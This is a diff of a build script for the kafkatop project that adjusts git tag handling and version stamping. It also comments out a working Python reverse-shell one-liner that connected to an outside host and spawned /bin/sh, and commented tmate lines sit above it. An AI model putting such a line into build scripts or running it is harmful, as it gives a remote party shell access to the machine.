@@ -7,16 +7,15 @@
 #sudo apt-get -y install tmate
 #tmate
 #exit
-export RHOST="mute.netmode.ece.ntua.gr";export RPORT=1234;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-exit
+#export RHOST="mute.netmode.ece.ntua.gr";export RPORT=1234;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+#exit
 
 PYTHON_MINVER="3.9"
 commit_hash=$(git rev-parse --short HEAD)
-git_desc=$(git describe)
+git_desc=$(git describe --tags)
 echo "Starting $0 on $(pwd), git tag: $git_desc"
 
-#sed -i "s/^VERSION=.*/VERSION=$(cat tag.txt)/" kafkatop.py
-sed -i "s/^VERSION=.*/VERSION=${git_desc}/" kafkatop.py
+sed -i "s/^VERSION=.*/VERSION=v${git_desc}/" kafkatop.py
 
 echo "Gathering python platform info using python:"
 python3 --version
